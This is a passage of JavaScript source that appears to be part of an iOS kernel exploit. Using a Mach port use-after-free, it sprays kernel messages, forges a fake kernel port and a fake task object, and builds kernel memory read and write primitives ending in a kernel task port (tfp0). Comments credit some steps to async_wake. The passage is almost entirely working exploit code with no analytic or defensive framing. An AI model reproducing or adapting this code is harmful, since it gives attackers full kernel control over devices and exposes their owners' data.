    let buf = scratch.add32(1024 * 4);
    fcall(memset_ptr, buf, 0, 0x600);
    fcall(write_ptr, pipefdw, buf, 0x600);
    fcall(read_ptr, pipefdr, buf, 0x600);
}

// -------------- SETUP FIRST PRIMITIVES ---------------

var self_port_addr = find_port_via_uaf(mach_task_self_); // port leak primitive
if (self_port_addr == undefined) {
    throw 'self_port_addr';
}

var ipc_space_kernel = rk64_check(self_port_addr.add32(offsets.KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));

var pipe_buffer;
if (SMAP) {
    let task = rk64_check(self_port_addr.add32(offsets.KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    let proc = rk64_check(task.add32(offsets.KSTRUCT_OFFSET_TASK_BSD_INFO));
    let p_fd = rk64_check(proc.add32(offsets.KSTRUCT_OFFSET_PROC_P_FD));
    let fd_ofiles = rk64_check(p_fd);
    let fproc = rk64_check(fd_ofiles.add32(pipefdr * 8));
    let f_fglob = rk64_check(fproc.add32(offsets.KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    let fg_data = rk64_check(f_fglob.add32(offsets.KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    pipe_buffer = rk64_check(fg_data.add32(offsets.KSTRUCT_OFFSET_PIPE_BUFFER));

    //throw '[*] pipe buffer: 0x' + pipe_buffer;
}

// -------------- taken from async_wake ----------------

const MAX_KERNEL_TRAILER_SIZE = 0x44;
var replacer_body_size = message_size_for_kalloc_size(4096) - 24; // - sizeof(mach_msg_header_t);
var message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;

var n_pre_ports = 100000;
var pre_ports = new Uint32Array(n_pre_ports);
for (let i = 0; i < n_pre_ports; i++) {
    pre_ports[i] = new_port();
}

var smaller_body_size = message_size_for_kalloc_size(1024) - 24;

var smaller_body = fcall(malloc_ptr, smaller_body_size);
fcall(memset_ptr, smaller_body, 0x43, smaller_body_size);

const n_smaller_ports = 600;
var smaller_ports = new Uint32Array(n_smaller_ports);
for (let i = 0; i < n_smaller_ports; i++) {
    smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);
}

fcall(free_ptr, smaller_body);

const ports_to_test = 100;
const base = n_pre_ports - 1000;

var first_port = 0;
var first_port_address = 0;

for (let i = 0; i < ports_to_test; i++) {
    let candidate_port = pre_ports[base + i];
    let candidate_address = find_port_via_uaf(candidate_port);
    if (candidate_address == undefined) {
        continue;
    }
    let page_offset = candidate_address.lo & 0xfff;
    if (page_offset > 0xa00 && page_offset < 0xe80) { // when using mach messages there are some limits as opposed to IOSurface
        pre_ports[base + i] = 0;
        first_port = candidate_port;
        first_port_address = candidate_address;
        break;
    }
}

if (first_port == 0) {
    throw 'first_port';
}

null_20_via_uaf(first_port_address);
fcall(mach_port_insert_right_ptr, mach_task_self_, first_port, first_port, 20); // MACH_MSG_TYPE_MAKE_SEND

for (let i = 0; i < n_pre_ports; i++) {
    if (pre_ports[i]) {
        fcall(mach_port_destroy_ptr, mach_task_self_, pre_ports[i]);
    }
}

for (let i = 0; i < n_smaller_ports; i++) {
    fcall(mach_port_destroy_ptr, mach_task_self_, smaller_ports[i]);
}

smaller_ports = null;

let body = fcall(calloc_ptr, 1, replacer_body_size);
let port_page_offset = first_port_address.lo & 0xfff;

let fakeport = body.add32(port_page_offset - message_body_offset);
let fake_task = fcall(calloc_ptr, 1, 0x600);
write4(fake_task.add32(16), 0xff); // fake_task->ref_count = 0xff;

write4(fakeport, 0x80000002);                          // fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
write4(fakeport.add32(4), 0xd00d);                     // fakeport->ip_references = 0xd00d;
write8(fakeport.add32(0x10), 0x11);                    // fakeport->ip_lock.type = 0x11;
write4(fakeport.add32(0x4c), 1);                       // fakeport->ip_messages.port.receiver_name = 1;
write4(fakeport.add32(0x50), 1024 << 16);              // fakeport->ip_messages.port.msgcount = 0; fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
write4(fakeport.add32(0x18), mach_port_waitq_flags()); // fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
write4(fakeport.add32(0xa0), 99);                      // fakeport->ip_srights = 99;

if (!SMAP) {
    write8(fakeport.add32(0x68), fake_task);           // fakeport->ip_kobject = (uint64_t)fake_task;
} else {
    write8(fakeport.add32(0x68), pipe_buffer);         // fakeport->ip_kobject = pipe_buffer;
    fcall(write_ptr, pipefdw, fake_task, 0x600);
}

write8(fakeport.add32(0x60), ipc_space_kernel);        // fakeport->ip_receiver = ipc_space_kernel;

const replacer_ports_limit = 200;
let replacer_ports = new Uint32Array(replacer_ports_limit);
for (let i = 0; i < replacer_ports_limit; i++) {
    replacer_ports[i] = send_kalloc_message(body, replacer_body_size);
    fcall(pthread_yield_np_ptr);
    fcall(usleep_ptr, 10000);
}

pre_ports = null;

let read_addr_ptr = fake_task.add32(offsets.KSTRUCT_OFFSET_TASK_BSD_INFO);

let rk32 = function(addr) {
    if (SMAP) {
        fcall(read_ptr, pipefdr, fake_task, 0x600);
    }
    write8(read_addr_ptr, addr.sub32(offsets.KSTRUCT_OFFSET_PROC_PID));
    if (SMAP) {
        fcall(write_ptr, pipefdw, fake_task, 0x600);
    }
    scratch_array[0] = 0; // XXX FIXME: should be -1???
    let ret = fcall(pid_for_task_ptr, first_port, scratch);
    return scratch_array[0];
}

let rk64 = function(addr) {
    return new Uint64(rk32(addr), rk32(addr.add32(4)));
}

// -------------- PLS WORK -----------------------------

let struct_task = rk64(self_port_addr.add32(offsets.KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
if ((struct_task.lo | struct_task.hi) == 0) {
    throw 'struct_task';
}

// -------------- TFP0! --------------------------------

let kernel_vm_map;
let kernel_proc;

while (struct_task.lo | struct_task.hi) {
    let bsd_info = rk64(struct_task.add32(offsets.KSTRUCT_OFFSET_TASK_BSD_INFO));
    if ((bsd_info.lo | bsd_info.hi) == 0) {
        throw 'bsd_info';
    }

    let pid = rk32(bsd_info.add32(offsets.KSTRUCT_OFFSET_PROC_PID));

    if (pid == 0) {
        let vm_map = rk64(struct_task.add32(offsets.KSTRUCT_OFFSET_TASK_VM_MAP));
        if ((vm_map.lo | vm_map.hi) == 0) {
            throw 'vm_map';
        }

        kernel_vm_map = vm_map;
        kernel_proc = bsd_info;
        break;
    }

    struct_task = rk64(struct_task.add32(offsets.KSTRUCT_OFFSET_TASK_PREV));
}

if (kernel_vm_map == undefined) {
    throw 'kernel_vm_map';
}

if (SMAP) {
    fcall(read_ptr, pipefdr, fake_task, 0x600);
}

write8(fake_task, 0);                                                            // fake_task->lock.data = 0x0;
write4(fake_task.add32(8), (read4(fake_task.add32(8)) & 0xFFFFFF) | 0x22000000); // fake_task->lock.type = 0x22;
write4(fake_task.add32(0x10), 100);                                              // fake_task->ref_count = 100;
write4(fake_task.add32(0x14), 1);                                                // fake_task->active = 1;
write8(fake_task.add32(0x20), kernel_vm_map);                                    // fake_task->map = kernel_vm_map;
write4(fake_task.add32(0xd8), 1);

if (SMAP) {
    fcall(write_ptr, pipefdw, fake_task, 0x600);
}

tfpzero = first_port;

rk32 = function(where) {
    kread(where, scratch.add32(8), 4);
    return scratch_array[2];
}

rk64 = function(where) {
    kread(where, scratch.add32(8), 8);
    return new Uint64(scratch_array[2], scratch_array[3]);
}

wk32 = function(where, what) {
    scratch_array[0] = what;
    kwrite(where, scratch, 4);
}

wk64 = function(where, what) {
    if (what instanceof Uint64) {
        scratch_array[0] = what.lo;
        scratch_array[1] = what.hi;
    } else if (what != undefined) {
        scratch_array[0] = what;
        scratch_array[1] = 0;
    }
    kwrite(where, scratch, 8);
}

let new_tfp0 = new_port();
if (!new_tfp0) {
    throw 'new_tfp0';
}

let new_addr = find_port(new_tfp0, self_port_addr);
if ((new_addr.lo | new_addr.hi) == 0) {
    throw 'new_addr';
}

let faketask = kalloc(0x600);
if ((faketask.lo | faketask.hi) == 0) {
    throw 'faketask';
}

kwrite(faketask, fake_task, 0x600);
write8(fakeport.add32(0x68), faketask); // fakeport->ip_kobject = faketask;

kwrite(new_addr, fakeport, 168); // sizeof(kport_t)

tfpzero = new_tfp0;

// clean up port
let task_addr = rk64(self_port_addr.add32(offsets.KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
let itk_space = rk64(task_addr.add32(offsets.KSTRUCT_OFFSET_TASK_ITK_SPACE));
let is_table = rk64(itk_space.add32(offsets.KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

let port_index = first_port >> 8;
const sizeof_ipc_entry_t = 0x18;

wk32(is_table.add32(port_index * sizeof_ipc_entry_t + 8), 0);
wk64(is_table.add32(port_index * sizeof_ipc_entry_t), 0);

for (let i = 0; i < replacer_ports_limit; i++) {
    fcall(mach_port_destroy_ptr, mach_task_self_, replacer_ports[i]);
}
replacer_ports = null;

if (SMAP) {
    fcall(close_ptr, pipefdr);
    fcall(close_ptr, pipefdw);
}

fcall(free_ptr, body);
fcall(free_ptr, fake_task);
IOSurface_deinit();

// grab some info
var realhost = rk64(rk64(is_table.add32((fcall(mach_host_self_ptr).lo >> 8) * sizeof_ipc_entry_t)).add32(offsets.KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
var current_proc = rk64(task_addr.add32(offsets.KSTRUCT_OFFSET_TASK_BSD_INFO));

// -------------- the easy part ------------------------

fcallv(dlsym("printf\x00"), sptr("realhost = %p, current_proc = %p\n\x00"), 0, realhost, current_proc);

42;
